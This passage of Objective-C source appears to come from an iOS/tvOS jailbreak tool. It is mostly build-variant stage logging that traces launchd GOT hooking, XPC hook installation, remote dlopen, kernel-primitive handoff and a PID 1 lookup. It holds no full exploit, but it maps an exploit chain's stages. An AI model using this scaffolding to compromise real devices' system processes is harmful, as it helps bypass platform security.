    dt699_stage([[NSString stringWithFormat:@"BUILD102739C_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739C_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739C_INSTALL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739B_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739B_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739B_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739B_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739B_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739B_INSTALL_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102739A_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102739A_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739A_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739A_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739A_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102739A_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102738Z_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_PROBE_ENTERED=%s",
        dt102735d_yesno(obs && obs->got_probe_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_PERSISTENT_INSTALL_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_persistent_install_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_GOT_PROTECTION_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_CTOR_RETURN_PASS=%s",
        dt102735d_yesno(obs && obs->ctor_return_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102738Y_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_PROBE_ENTERED=%s",
        dt102735d_yesno(obs && obs->got_probe_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_WRAPPER_INVOKED_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_invoked_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_INVOCATION_COUNT_BEFORE=%llu",
        (unsigned long long)(obs ? obs->got_wrapper_invocation_count_before : 0)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_INVOCATION_COUNT_AFTER=%llu",
        (unsigned long long)(obs ? obs->got_wrapper_invocation_count_after : 0)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_ORIGINAL_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_original_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_PROTECTION_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_POINTER_UNCHANGED=%s",
        dt102735d_yesno(obs && obs->got_pointer_unchanged)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102738X_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_PROBE_ENTERED=%s",
        dt102735d_yesno(obs && obs->got_probe_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_PRESTORE_MATCH=%s",
        dt102735d_yesno(obs && obs->got_prestore_match)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_WRAPPER_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_ORIGINAL_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_original_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_WRAPPER_ROUNDTRIP_PASS=%s",
        dt102735d_yesno(obs && obs->got_wrapper_roundtrip_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_PROTECTION_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_POINTER_UNCHANGED=%s",
        dt102735d_yesno(obs && obs->got_pointer_unchanged)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738X_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#elif defined(DT_BUILD102738W_VARIANT)
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_WALL2_RESTORE_RESULT=%s",
        restore_r == 0 ? "PASS" : "FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_PROBE_ENTERED=%s",
        dt102735d_yesno(obs && obs->got_probe_entered)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_PRESTORE_MATCH=%s",
        dt102735d_yesno(obs && obs->got_prestore_match)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_SAME_VALUE_STORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_same_value_store_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_PROTECTION_RESTORE_PASS=%s",
        dt102735d_yesno(obs && obs->got_restore_pass)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_POINTER_UNCHANGED=%s",
        dt102735d_yesno(obs && obs->got_pointer_unchanged)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102738W_RESULT=%s",
        result ? result : "INCONCLUSIVE"] UTF8String]);
#endif
#endif
}
#endif
#endif

static uint64_t dt102732c_pid1_proc_snapshot(void)
{
    uint64_t p = proc_find(1);
    if (p)
        proc_rele(p);
    return p;
}

static NSString *dt102732c_pid1_path(void)
{
    typedef int (*dt_proc_pidpath_fn)(int, void *, uint32_t);
    dt_proc_pidpath_fn proc_pidpath_fn =
        (dt_proc_pidpath_fn)dlsym(RTLD_DEFAULT, "proc_pidpath");
    if (!proc_pidpath_fn)
        return @"UNAVAILABLE";
    char buf[4096] = {0};
    int n = proc_pidpath_fn(1, buf, sizeof(buf));
    if (n <= 0 || !buf[0])
        return @"UNAVAILABLE";
    return [NSString stringWithUTF8String:buf] ?: @"UNAVAILABLE";
}

static int dt102732c_run_constructor_boomerang_only(void (^log)(NSString *line),
    NSString **verdictOut)
{
    BOOL preboot_rw_confirmed = NO;
    dt102732c_wall2_context_t wall2 = {0};
    dt681_boomerang_info_t boomerang = {0};
#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt102735d_trace_ctx_t trace_ctx = {0};
#endif
    BOOL boomerang_started = NO;
    uint64_t pid1_before = 0;
    int rc = -1;
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    NSTimeInterval wall2_apply_ts = 0.0;
    NSTimeInterval remote_return_ts = 0.0;
    NSTimeInterval wall2_restore_begin_ts = 0.0;
    NSTimeInterval wall2_restore_end_ts = 0.0;
    int restore_r_102737 = -1;
#endif

    dt699_stage("BUILD102732C_BEGIN");
#if DT_BUILD_NUM == 102735
    dt699_stage("BUILD102735D_BEGIN");
    dt699_stage("BUILD102735D_SCOPE=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
    dt699_stage("BUILD102732C_SCOPE=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
    dt699_stage("COMPILED_SCOPE_MARKER=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
#elif DT_BUILD_NUM == 102737
    dt699_stage("BUILD102737D_BEGIN");
    dt699_stage("BUILD102737D_SCOPE=PTE_HANDOFF_AND_WALL2_LIFETIME_DIAGNOSTIC");
    dt699_stage("BUILD102737D_WALL2_RESTORE_BEFORE_CONSTRUCTOR_TERMINAL=NO");
    dt699_stage("BUILD102737D_WALL2_EARLY_RESTORE_ROOT_CAUSE_PROVEN=NO");
    dt699_stage("BUILD102737D_TASK_PORT_REPAIR_CHANGED=NO");
    dt699_stage("BUILD102737D_OPAINJECT_HELPER_CHANGED=NO");
    dt699_stage("BUILD102737D_REMOTE_DLOPEN_IMPLEMENTATION_CHANGED=NO");
    dt699_stage("BUILD102737D_CONSTRUCTOR_VALIDATOR_CHANGED=NO");
    dt699_stage("BUILD102737D_DEPENDENCY_GATE_CHANGED=NO");
    dt699_stage("BUILD102737D_WALL2_CORE_CHANGED=NO");
    dt699_stage("BUILD102737D_TRUSTCACHE_CORE_CHANGED=NO");
    dt699_stage("BUILD102737D_STAGE_B_IMPLEMENTED=NO");
    dt699_stage("BUILD102737D_GOT_ACCESS_IMPLEMENTED=NO");
    dt699_stage("BUILD102737D_PROTECTION_MUTATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102737D_OUTER_PRIMITIVES_ERROR_CONTRACT_CHANGED=NO");
    dt699_stage("BUILD102737D_PTE_HANDOFF_INTERNAL_SUBFAILURE_EXPOSED=YES");
    dt699_stage("BUILD102737D_BOOMERANG_PROTOCOL_CHANGED=NO");
    dt699_stage("BUILD102737D_PTE_HANDOFF_PROTOCOL_CHANGED=NO");
    dt699_stage("BUILD102737D_PTE_HANDOFF_STRUCT_LAYOUT_CHANGED=NO");
    dt699_stage("BUILD102732C_SCOPE=PTE_HANDOFF_AND_WALL2_LIFETIME_DIAGNOSTIC");
    dt699_stage("COMPILED_SCOPE_MARKER=PTE_HANDOFF_AND_WALL2_LIFETIME_DIAGNOSTIC");
#elif DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_BEGIN");
    dt699_stage("BUILD102738P_SCOPE=LAUNCHD_GOT_PROTECTION_ONLY");
    dt699_stage("BUILD102738P_BLUEPRINT=IOS_POST_BOOMERANG_PRE_XPC_HOOK");
#ifdef DT_BUILD102739C_VARIANT
#ifdef DT_BUILD102739D_VARIANT
#ifdef DT_BUILD102739J_VARIANT
    dt699_stage("BUILD102739J_BEGIN");
    dt699_stage("BUILD102739J_SCOPE=CONTROLLED_REPLY_ROUNDTRIP");
    dt699_stage("BUILD102739J_BLUEPRINT=IOS_JBSERVER_LINES_113_THROUGH_187_AND_XPC_HOOK_LINES_51_THROUGH_60");
    dt699_stage("BUILD102739J_FROZEN_102739I_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739J_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739J_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739J_TRIGGER_DOMAIN=1");
    dt699_stage("BUILD102739J_TRIGGER_ACTION=1");
    dt699_stage("BUILD102739J_REPLY_ROOT_PATH=STATIC_SENTINEL");
    dt699_stage("BUILD102739J_REPLY_RESULT=0");
    dt699_stage("BUILD102739J_COMMITTED_INPUT_CONSUME=YES");
    dt699_stage("BUILD102739J_COMMITTED_RETURN_VALUE=22");
    dt699_stage("BUILD102739J_REAL_JBROOT_HANDLER_INVOKED=NO");
    dt699_stage("BUILD102739J_BOOTSTRAP_CHANGED=NO");
#ifdef DT_BUILD102739K_VARIANT
    dt699_stage("BUILD102739K_BEGIN");
    dt699_stage("BUILD102739K_SCOPE=ROOTFUL_BOOTSTRAP_READ_ONLY_PREFLIGHT");
    dt699_stage("BUILD102739K_BASELINE=BUILD102739J_FROZEN");
    dt699_stage("BUILD102739K_PAYLOAD=APPLETVOS_ARM64_CF1900");
    dt699_stage("BUILD102739K_BOOTSTRAP_WRITES_ENABLED=NO");
    dt699_stage("BUILD102739K_SERVICE_MUTATION_ENABLED=NO");
    dt699_stage("BUILD102739K_WALL2_RESTORE_ORDER_REPAIR=YES");
    dt699_stage("BUILD102739K_RESTORE_BEFORE_CAPTURE_REPLAY=YES");
    dt699_stage("BUILD102739K_RESTORE_BEFORE_TRACE_POLL=YES");
#ifdef DT_BUILD102739L_VARIANT
    dt699_stage("BUILD102739L_BEGIN");
    dt699_stage("BUILD102739L_SCOPE=ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_PREFLIGHT");
    dt699_stage("BUILD102739L_BASELINE=BUILD102739K_OBS2_REPAIRED");
    dt699_stage("BUILD102739L_BOOTSTRAP_WRITES_ENABLED=NO");
#ifdef DT_BUILD102739M_VARIANT
    dt699_stage("BUILD102739M_SCOPE=EXTERNAL_HELPER_EXECUTION_PROOF");
    dt699_stage("BUILD102739M_BASELINE=BUILD102739L_FROZEN_DEVICE_PASS");
    dt699_stage("BUILD102739M_BOOTSTRAP_EXTRACTION_ENABLED=NO");
#endif
#endif
#endif
#elif defined(DT_BUILD102739I_VARIANT)
    dt699_stage("BUILD102739I_BEGIN");
    dt699_stage("BUILD102739I_SCOPE=CONTROLLED_ACTION_HANDLER_ABI");
    dt699_stage("BUILD102739I_BLUEPRINT=IOS_JBSERVER_LINE_104_HANDLER_CALL_ABI");
    dt699_stage("BUILD102739I_FROZEN_102739H_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739I_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739I_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739I_TRIGGER_DOMAIN=1");
    dt699_stage("BUILD102739I_TRIGGER_ACTION=1");
    dt699_stage("BUILD102739I_CONTROLLED_HANDLER_ARGUMENT_COUNT=8");
    dt699_stage("BUILD102739I_CONTROLLED_HANDLER_OUTPUT=STATIC_SENTINEL");
    dt699_stage("BUILD102739I_REAL_JBROOT_HANDLER_INVOKED=NO");
    dt699_stage("BUILD102739I_REPLY_CREATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102739I_OBJECT_OWNERSHIP_CHANGED=NO");
    dt699_stage("BUILD102739I_ORIGINAL_RETURN_CHANGED=NO");
    dt699_stage("BUILD102739I_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102739H_VARIANT)
    dt699_stage("BUILD102739H_BEGIN");
    dt699_stage("BUILD102739H_SCOPE=READ_ONLY_ACTION_ARGUMENT_MARSHALLING");
    dt699_stage("BUILD102739H_BLUEPRINT=IOS_JBSERVER_LINES_59_THROUGH_102");
    dt699_stage("BUILD102739H_FROZEN_102739G_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739H_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739H_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739H_TRIGGER_DOMAIN=1");
    dt699_stage("BUILD102739H_TRIGGER_ACTION=1");
    dt699_stage("BUILD102739H_ARGUMENT_DESCRIPTOR_COUNT=1");
    dt699_stage("BUILD102739H_ARGUMENT_DESCRIPTOR_NAME=root-path");
    dt699_stage("BUILD102739H_ARGUMENT_DESCRIPTOR_TYPE=JBS_TYPE_STRING");
    dt699_stage("BUILD102739H_ARGUMENT_DESCRIPTOR_DIRECTION=OUT");
    dt699_stage("BUILD102739H_HANDLER_INVOCATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102739H_REPLY_CREATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102739H_OBJECT_OWNERSHIP_CHANGED=NO");
    dt699_stage("BUILD102739H_ORIGINAL_RETURN_CHANGED=NO");
    dt699_stage("BUILD102739H_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102739G_VARIANT)
    dt699_stage("BUILD102739G_BEGIN");
    dt699_stage("BUILD102739G_SCOPE=READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION");
    dt699_stage("BUILD102739G_BLUEPRINT=IOS_JBSERVER_PREFIX_THROUGH_ACTION_RESOLUTION");
    dt699_stage("BUILD102739G_FROZEN_102739F_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739G_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739G_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739G_TRIGGER_DOMAIN=1");
    dt699_stage("BUILD102739G_TRIGGER_ACTION=1");
    dt699_stage("BUILD102739G_SHADOW_DOMAIN_TABLE_ENABLED=YES");
    dt699_stage("BUILD102739G_PERMISSION_CHECK_ENABLED=YES");
    dt699_stage("BUILD102739G_HANDLER_DISPATCH_IMPLEMENTED=NO");
    dt699_stage("BUILD102739G_REPLY_CREATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102739G_OBJECT_OWNERSHIP_CHANGED=NO");
    dt699_stage("BUILD102739G_ORIGINAL_RETURN_CHANGED=NO");
    dt699_stage("BUILD102739G_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102739F_VARIANT)
    dt699_stage("BUILD102739F_BEGIN");
    dt699_stage("BUILD102739F_SCOPE=READ_ONLY_CALLER_IDENTITY");
    dt699_stage("BUILD102739F_BLUEPRINT=IOS_XPC_HOOK_CALLER_IDENTITY_GUARDS_ONLY");
    dt699_stage("BUILD102739F_FROZEN_102739E_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739F_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739F_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739F_TRIGGER_DOMAIN=1");
    dt699_stage("BUILD102739F_TRIGGER_ACTION=1");
    dt699_stage("BUILD102739F_OBJECT_OWNERSHIP_CHANGED=NO");
    dt699_stage("BUILD102739F_ORIGINAL_RETURN_CHANGED=NO");
    dt699_stage("BUILD102739F_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102739F_HANDLER_DISPATCH_IMPLEMENTED=NO");
    dt699_stage("BUILD102739F_REPLY_CREATION_IMPLEMENTED=NO");
    dt699_stage("BUILD102739F_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102739E_VARIANT)
    dt699_stage("BUILD102739E_BEGIN");
    dt699_stage("BUILD102739E_SCOPE=READ_ONLY_POST_ORIGINAL_XPC_DICTIONARY_CLASSIFICATION");
    dt699_stage("BUILD102739E_BLUEPRINT=IOS_XPC_HOOK_TYPE_AND_ENVELOPE_GUARDS_ONLY");
    dt699_stage("BUILD102739E_FROZEN_102739D_CHAIN_REUSED=YES");
    dt699_stage("BUILD102739E_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739E_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739E_OBJECT_OWNERSHIP_CHANGED=NO");
    dt699_stage("BUILD102739E_ORIGINAL_RETURN_CHANGED=NO");
    dt699_stage("BUILD102739E_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102739E_BOOTSTRAP_CHANGED=NO");
#else
    dt699_stage("BUILD102739D_BEGIN");
    dt699_stage("BUILD102739D_SCOPE=DETERMINISTIC_POST_WALL2_LAUNCHD_XPC_TRIGGER");
    dt699_stage("BUILD102739D_FROZEN_102739C_HOOK_REUSED=YES");
    dt699_stage("BUILD102739D_TRIGGER_TRANSPORT=TASK_BOOTSTRAP_PORT_XPC_PIPE");
    dt699_stage("BUILD102739D_TRIGGER_REQUEST_COUNT=1");
    dt699_stage("BUILD102739D_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102739D_JBSERVER_IMPLEMENTED=NO");
#endif
#endif
#if !defined(DT_BUILD102739E_VARIANT) && !defined(DT_BUILD102739F_VARIANT) \
    && !defined(DT_BUILD102739G_VARIANT) && !defined(DT_BUILD102739H_VARIANT) \
    && !defined(DT_BUILD102739I_VARIANT)
    dt699_stage("BUILD102739C_BEGIN");
    dt699_stage("BUILD102739C_SCOPE=POST_WALL2_XPC_OUTPUT_CONTRACT_OBSERVATION");
    dt699_stage("BUILD102739C_BLUEPRINT=IOS_XPC_HOOK_GUARDED_OUTPUT_CONTRACT");
    dt699_stage("BUILD102739C_FROZEN_102739B_RETURN_FOUNDATION_REUSED=YES");
    dt699_stage("BUILD102739C_TVOS_LAUNCHD_X4_OUTPUT_POINTER_PROVEN_BY_IDA=YES");
    dt699_stage("BUILD102739C_TVOS_LAUNCHD_W0_ZERO_SUCCESS_PROVEN_BY_IDA=YES");
    dt699_stage("BUILD102739C_OBSERVER_TRANSPORT_REUSED=READ_ONLY_TASK_PORT");
    dt699_stage("BUILD102739C_REMOTE_DLOPEN_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739C_REMOTE_WRITE_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739C_GUARDED_XOUT_DEREFERENCE=YES");
    dt699_stage("BUILD102739C_XPC_API_CALLS=NO");
    dt699_stage("BUILD102739C_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102739C_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102739C_BOOTSTRAP_CHANGED=NO");
#endif
#elif defined(DT_BUILD102739B_VARIANT)
    dt699_stage("BUILD102739B_BEGIN");
    dt699_stage("BUILD102739B_SCOPE=POST_WALL2_ORIGINAL_RETURN_PATH_OBSERVATION");
    dt699_stage("BUILD102739B_BLUEPRINT=IOS_XPC_HOOK_POST_ORIGINAL_RETURN_PREREQUISITE");
    dt699_stage("BUILD102739B_FROZEN_102739A_INSTALL_FOUNDATION_REUSED=YES");
    dt699_stage("BUILD102739B_OBSERVER_TRANSPORT_REUSED=READ_ONLY_TASK_PORT");
    dt699_stage("BUILD102739B_REMOTE_DLOPEN_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739B_REMOTE_WRITE_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739B_MESSAGE_OR_XOUT_DEREFERENCE=NO");
    dt699_stage("BUILD102739B_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102739B_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102739B_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102739A_VARIANT)
    dt699_stage("BUILD102739A_BEGIN");
    dt699_stage("BUILD102739A_SCOPE=POST_WALL2_READ_ONLY_WRAPPER_INVOCATION_OBSERVATION");
    dt699_stage("BUILD102739A_BLUEPRINT=IOS_INITXPCHOOKS_INVOCATION_PREREQUISITE");
    dt699_stage("BUILD102739A_FROZEN_102738Z_INSTALL_FOUNDATION_REUSED=YES");
    dt699_stage("BUILD102739A_SHARED_TELEMETRY_FILE_IMPLEMENTED=NO");
    dt699_stage("BUILD102739A_REMOTE_DLOPEN_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739A_REMOTE_WRITE_FOR_OBSERVER=NO");
    dt699_stage("BUILD102739A_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102739A_BOOTSTRAP_CHANGED=NO");
#elif defined(DT_BUILD102738Z_VARIANT)
    dt699_stage("BUILD102738Z_BEGIN");
    dt699_stage("BUILD102738Z_SCOPE=LAUNCHD_GOT_PERSISTENT_TRANSPARENT_WRAPPER_INSTALL_ONLY");
    dt699_stage("BUILD102738Z_BLUEPRINT=IOS_INITXPCHOOKS_PERSISTENT_LIFETIME");
    dt699_stage("BUILD102738Z_GOT_WRAPPER_INSTALL_IMPLEMENTED=YES");
    dt699_stage("BUILD102738Z_WRAPPER_PERSISTENT_AFTER_CTOR=YES");
    dt699_stage("BUILD102738Z_CONSTRUCTOR_OBSERVATION_WAIT_MS=0");
    dt699_stage("BUILD102738Z_ORIGINAL_POINTER_RESTORE_IN_CTOR=NO");
    dt699_stage("BUILD102738Z_INVOCATION_PROOF_CLAIMED=NO");
    dt699_stage("BUILD102738Z_XPC_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102738Z_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102738Z_BOOTSTRAP_CHANGED=NO");
    dt699_stage("BUILD102738Z_FROZEN_102738X_FOUNDATION_REUSED=YES");
#elif defined(DT_BUILD102738Y_VARIANT)
    dt699_stage("BUILD102738Y_BEGIN");
    dt699_stage("BUILD102738Y_SCOPE=CONTROLLED_LAUNCHD_GOT_WRAPPER_NONBLOCKING_SINGLE_SAMPLE");
    dt699_stage("BUILD102738Y_BLUEPRINT=IOS_XPC_HOOK_ABI_NATIVE_TVOS_GOT_BACKEND");
    dt699_stage("BUILD102738Y_GOT_WRAPPER_INSTALL_IMPLEMENTED=YES");
    dt699_stage("BUILD102738Y_INVOCATION_COUNTER_IMPLEMENTED=YES");
    dt699_stage("BUILD102738Y_ORIGINAL_POINTER_RESTORE_IMPLEMENTED=YES");
    dt699_stage("BUILD102738Y_MAX_OBSERVATION_MS=0");
    dt699_stage("BUILD102738Y_XPC_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102738Y_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102738Y_BOOTSTRAP_CHANGED=NO");
    dt699_stage("BUILD102738Y_FROZEN_102738X_FOUNDATION_REUSED=YES");
#elif defined(DT_BUILD102738X_VARIANT)
    dt699_stage("BUILD102738X_BEGIN");
    dt699_stage("BUILD102738X_SCOPE=LAUNCHD_GOT_TRANSPARENT_REBIND_ROUNDTRIP_ONLY");
    dt699_stage("BUILD102738X_BLUEPRINT=IOS_XPC_HOOK_ABI_NATIVE_TVOS_GOT_BACKEND");
    dt699_stage("BUILD102738X_GOT_DIFFERENT_POINTER_STORE_IMPLEMENTED=YES");
    dt699_stage("BUILD102738X_GOT_ORIGINAL_POINTER_RESTORE_IMPLEMENTED=YES");
    dt699_stage("BUILD102738X_WRAPPER_PERSISTENT_INSTALL=NO");
    dt699_stage("BUILD102738X_XPC_MESSAGE_PARSING_IMPLEMENTED=NO");
    dt699_stage("BUILD102738X_JBSERVER_IMPLEMENTED=NO");
    dt699_stage("BUILD102738X_BOOTSTRAP_CHANGED=NO");
    dt699_stage("BUILD102738X_FROZEN_102738R_FOUNDATION_REUSED=YES");
#elif defined(DT_BUILD102738W_VARIANT)
    dt699_stage("BUILD102738W_BEGIN");
    dt699_stage("BUILD102738W_SCOPE=LAUNCHD_GOT_SAME_VALUE_STORE_ONLY");
    dt699_stage("BUILD102738W_BLUEPRINT=IOS_HOOK_BACKEND_STORE_PREREQUISITE");
    dt699_stage("BUILD102738W_GOT_POINTER_WRITE_IMPLEMENTED=YES");
    dt699_stage("BUILD102738W_GOT_POINTER_REPLACED=NO");
    dt699_stage("BUILD102738W_XPC_HOOK_INSTALL_IMPLEMENTED=NO");
    dt699_stage("BUILD102738W_FROZEN_102738R_FOUNDATION_REUSED=YES");
#else
    dt699_stage("BUILD102738P_GOT_POINTER_WRITE_IMPLEMENTED=NO");
    dt699_stage("BUILD102738P_GOT_POINTER_WRITE_PERFORMED=NO");
#endif
#if defined(DT_ROOTLESS_R24)
    dt699_stage("BUILD102738P_XPC_HOOK_PACKAGED=YES");
    dt699_stage("ROOTLESS_R24_CBR_SPAWN_HOOK_PACKAGED=YES");
    dt699_stage("ROOTLESS_R24_HOOK_DYLIB_PATH=/usr/lib/systemhook.dylib");
    dt699_stage("ROOTLESS_R24_TWEAKLOADER=OFF");
#else
    dt699_stage("BUILD102738P_XPC_HOOK_INSTALL_IMPLEMENTED=NO");
#endif
    dt699_stage("BUILD102738P_WALL2_RESTORE_AFTER_HOOK_TERMINAL_OR_TIMEOUT=YES");
    dt699_stage("BUILD102738P_WALL2_CORE_CHANGED=NO");
    dt699_stage("BUILD102738P_TASK_PORT_REPAIR_CHANGED=NO");
